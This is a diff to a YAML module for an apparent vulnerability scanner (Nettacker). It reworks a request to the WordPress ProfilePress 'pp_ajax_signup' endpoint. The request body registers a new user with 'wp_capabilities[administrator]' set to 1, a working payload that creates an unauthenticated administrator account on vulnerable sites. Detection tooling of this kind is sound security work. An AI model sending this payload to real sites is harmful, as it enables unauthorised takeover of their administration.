@@ -21,7 +21,7 @@ payloads:
         timeout: 3
         headers:
           User-Agent: "{user_agent}"
-          content-Type: "application/x-www-form-urlencoded"
+          content-Type: "multipart/form-data"
         allow_redirects: false
         ssl: false
         url:
@@ -38,19 +38,24 @@ payloads:
                 - 80
                 - 443
         data: 
-          "reg_username": "random1"
-          "reg_email": "random2@example.com"
-          "reg_password": "random3"
-          "reg_password_present": "true"
-          "reg_first_name": "random4"
-          "reg_last_name": "random5"
-          "_wp_http_referer": "/wp/?page_id=18"
-          "pp_current_url": url
-          "wp_capabilities[administrator]": "1"
-          "signup_form_id": "1"
-          "signup_referrer_page": ""
-          "action": "pp_ajax_signup"
-          "melange_id": ""
+          reg_username: "random1"
+          reg_email: "random2@example.com"
+          reg_password: "random3"
+          reg_password_present: "true"
+          reg_first_name: "random4"
+          reg_last_name: "random5"
+          _wp_http_referer: "/wp/?page_id=18"
+          pp_current_url: url
+          wp_capabilities[administrator]: "1"
+          signup_form_id: "1"
+          signup_referrer_page:
+            nettacker_fuzzer:
+              input_formal: "{{schema}}://target:{{ports}}/index.php/log-in/"
+              prefix: ""
+              suffix: ""
+              interceptors:
+          action: "pp_ajax_signup"
+          melange_id: ""
         response:
           condition_type: and
           conditions:
